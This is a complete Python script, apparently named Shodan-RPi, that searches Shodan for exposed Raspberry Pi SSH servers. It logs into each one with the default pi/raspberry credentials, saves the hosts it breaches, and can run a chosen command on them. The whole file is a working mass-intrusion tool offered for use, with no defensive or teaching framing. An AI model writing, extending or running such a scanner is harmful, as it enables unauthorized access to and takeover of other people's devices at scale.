#!/usr/bin/env python3

import argparse, os, socket, sys, time
try:
	from colorama import Fore, init
	import paramiko, shodan
except ImportError:
	print('[-] Failed to import an external module.')
	import platform
	if platform.system() == 'Linux':
		print('    Run "pip install -r requirements.txt".')
	elif platform.system() == 'Windows':
		print('    Run "python -m pip install -r requirements.txt".')
	else:
		print('    Please install the required modules inside the requirements.txt file.')
	sys.exit(1)

api_key = None # Set to None if you want to provide a key through arguments
version = "1.0.1/py3"

init() # Colored output

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Revert to AutoAddPolicy, as otherwise you would get lots of errors

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--input',
                    help='List of IPs',
                    metavar='FILE',
                    type=str,
                    default=None) # Input file argument, by default it writes to memory (list/array)
parser.add_argument('-n', '--no-exit',
                    help='Run indefinitely, restarting once the scan is finished',
                    action='store_true') # Don't exit on completion, but instead poll Shodan again
parser.add_argument('-k', '--api-key',
                    help='Use KEY as the Shodan API key',
                    metavar='KEY',
                    type=str,
                    default=api_key) # API Key (the error on startup can be resolved by changing the api_key variable)
parser.add_argument('-l', '--log-paramiko',
                    help='Log Paramiko SSH\'s progress to FILE',
                    metavar='FILE',
                    type=str) # Paramiko (the SSH client)'s log file location
parser.add_argument('-w', '--workfile',
                    help='Output successful IPs to FILE',
                    metavar='FILE',
                    type=str,
                    default='successful.txt') # Where to output successful IPs
parser.add_argument('-u', '--username',
                    help='Use alternate username',
                    type=str,
                    default='pi') # For alternate usernames
parser.add_argument('-p', '--password',
                    help='Use alternate password',
                    type=str,
                    default='raspberry') # For alternate passwords
parser.add_argument('-d', '--debug',
                    help='Show debug information',
                    action='store_true')
parser.add_argument('-s', '--search-string',
                    help='Use SSTRING as the Shodan query string',
                    metavar='SSTRING',
                    type=str,
                    default='Raspbian SSH')
parser.add_argument('-sk', '--ssh-key',
                    help='Try auth with KEY as SSH key',
                    metavar='KEY',
                    type=str) # Public key auth (disabled with Shodan)
parser.add_argument('-c', '--command',
                    help='Run CMD after a successful connection',
                    metavar='CMD',
                    type=str) # For example, run uname -a or lscpu
parser.add_argument('-L', '--limits',
                    help='Number of results from shodan, default is 100',
                    metavar='LIMITS',
                    type=str,
		    default='100')
args = parser.parse_args()

failtext = Fore.RED + '\tFAILED' + Fore.RESET
succtext = Fore.GREEN + '\tSUCCEEDED' + Fore.RESET

def fileExists():
	"""
		Check if the file provided using the -i/--input argument exists
	"""
	if args.input == None:
		return False
	if os.path.isfile(args.input) == False or os.path.getsize(args.input) == 0:
		return False
	else:
		return True

def arrayWrite(shodandata=None):
	"""
		Parse the IPs in shodandata and write them to an array/list
	"""
	r = []
	if shodandata == None:
		print('[-] arrayWrite() was called without any data!\n    Please create an issue on GitHub.')
		sys.exit(1)
	print('[*] Creating array using Shodan IPs...')
	for a in shodandata['matches']:
		r.append(a['ip_str'])
	return r

def getShodanResults(apikey, searchstring=args.search_string, limits=args.limits):
	"""
		Poll Shodan for results
	"""
	print('[*] Getting results from Shodan; this may take a while...')
	api = shodan.Shodan(apikey)
	try:
		results = api.search(searchstring, limit=limits)
		return results
	except shodan.APIError as e:
		print(('[-] Shodan API Error\n    Error string: %s\n\n    Please check the provided API key.' % str(e)))
		sys.exit(1)

def fileGet(shodandata=None):
	"""
		Call fileExists(), parse the IPs in shodandata, and write them to a file
	"""
	if args.input == None:
		print('[-] fileGet() was called, but a file wasn\'t provided!\n    Please create an issue on GitHub.')
		sys.exit(1)
	if fileExists() == False and shodandata != None:
		print(('[!] %s doesn\'t exist, creating new file with Shodan results...' % args.input))
		try:
			with open(args.input, 'w') as m:
				for a in shodandata['matches']:
					m.write(a['ip_str']+'\n')
		except IOError as e:
			print(('[-] Storage Write Error\n    Error string: %s\n\n    Please check that the directory you\'re in is writable by your user.' % str(e)))
			sys.exit(1)
		print(('[+] Write to %s complete!' % args.input))
		g = open(args.input, 'r').readlines()
		return [g.strip() for g in g]
	else:
		g = open(args.input, 'r').readlines()
		return [g.strip() for g in g]

def apikey():
	"""
		Get the API key
	"""
	if args.api_key == None:
		print('[-] No API key provided. Either use the -k/--api-key\n    argument or edit the script.')
		sys.exit(1)
	else:
		return args.api_key

def connect(server, username, password=None, key=None, cmd=None):
	"""
		SSH connect function
	"""
	try:
		if password != None:
			ssh.connect(server, username=username, password=password, timeout=5)
		elif key != None:
			ssh.connect(server, username=username, key_filename=key, timeout=5)
		with open(args.workfile, 'a') as fl:
			fl.write(server)
			if args.command:
				si, so, se = ssh.exec_command(cmd)
				time.sleep(1)
				si.close()
				fl.write(' | %s' % so.readlines())
			fl.write('\n')
		ssh.close()
		if args.command:
			return so.readlines()
		else:
			return 0 # Success
	except paramiko.AuthenticationException:
		return 1 # Authentication error
	except paramiko.ssh_exception.NoValidConnectionsError:
		return 2 # Connection error
	except socket.error:
		return 3 # Timeout
	except paramiko.ssh_exception.SSHException:
		return 4 # Generic SSH error
	except KeyboardInterrupt:
		return 9 # Interrupted
	except:
		return 5 # Unknown

def main():
	counter = 0
	success = 0
	if fileExists() == False:
		shres = getShodanResults(key)
	else:
		shres = None
	if args.input == None:
		targets = arrayWrite(shodandata=shres) # Temporary results
	else:
		targets = fileGet(shodandata=shres) # From file
	print(('[i] %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets')))
	try:
		for ip in targets:
			counter += 1
			print('[%s] %s ' % (counter, ip), end='')
			r = connect(ip, args.username, password=args.password, key=args.ssh_key, cmd=args.command)
			if r == 1:
				reason = ' [AUTHENT]' if args.debug else ''
				print((failtext + reason))
			elif r == 2:
				reason = ' [GENERAL]' if args.debug else ''
				print((failtext + reason))
			elif r == 3:
				reason = ' [TIMEOUT]' if args.debug else ''
				print((failtext + reason))
			elif r == 5:
				reason = ' [UNKNOWN]' if args.debug else ''
				print((failtext + reason))
			elif r == 9:
				raise KeyboardInterrupt
			else:
				success += 1
				if not args.command:
					print(succtext)
				else:
					try:
						print('\t%s' % r[0].replace('\n', ''))
					except:
						print(r)
		if not args.no_exit:
			print(('\n[+] Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
	except KeyboardInterrupt:
		print(('\n\n[!] Interrupted!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
		sys.exit(0)

if __name__ == "__main__":
	print('[i] Shodan-RPi\n')
	print('[i] Shodan-RPi %s\n  ' % version)
	if args.input != None:
		print(('\n[i] Reading from %s' % args.input))
	else:
		print('\n[i] Running with temporary results')
	if fileExists() == False:
		key = apikey()
	if args.log_paramiko:
		paramiko.util.log_to_file(args.log_paramiko)
		sys.exit(1)
	if args.no_exit and not args.input:
		print('[!] Running indefinitely! Press Ctrl+C to stop.')
		while True:
			main()
	elif args.no_exit and args.input:
		print('[-] -n/--no-exit is not available when reading from a file.')
		sys.exit(1)
	else:
		main()
